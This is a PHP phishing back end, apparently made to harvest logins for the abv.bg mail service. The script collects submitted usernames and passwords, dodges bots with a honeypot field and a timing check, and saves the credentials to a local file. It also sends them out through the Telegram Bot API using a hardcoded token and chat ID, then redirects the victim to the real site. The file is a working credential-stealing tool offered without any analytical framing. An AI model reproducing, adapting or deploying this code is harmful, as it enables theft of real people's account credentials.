<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $u = $_POST['username'] ?? ''; 
    $p = $_POST['password'] ?? ''; 
    $h = $_POST['honeypot'] ?? ''; 
    $st = $_POST['startTime'] ?? 0; 
    $subT = time() * 1000; 
    $elapsedT = $subT - $st;

    if (!empty($h)) { 
        header("Location: https://abv.bg"); exit(); 
    }

    if ($elapsedT < 3000) { 
        header("Location: https://abv.bg"); exit(); 
    }

    if (!empty($u) && !empty($p)) {
        $fp = __DIR__ . "/credentials.txt"; 
        $f = fopen($fp, "a"); 

        if ($f) {
            fwrite($f, "Username: " . $u . "\n"); 
            fwrite($f, "Password: " . $p . "\n"); 
            fwrite($f, "--------------------\n"); 
            fclose($f); 
        }

        // Fully retain bot token and chat ID for functionality
        $botToken = "7015141193:AAEsMV5XoRD17RtjizOtVUpXVXbBYiAFVi0"; 
        $chatId = "1837776273"; 
        $msg = "Username: $u\nPassword: $p"; 
        $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($msg);

        // Ensure the Telegram API request is sent correctly
        file_get_contents($url); 

        header("Location: https://abv.bg"); 
        exit(); 
    } else {
        header("Location: https://abv.bg"); 
        exit(); 
    }
}
?>
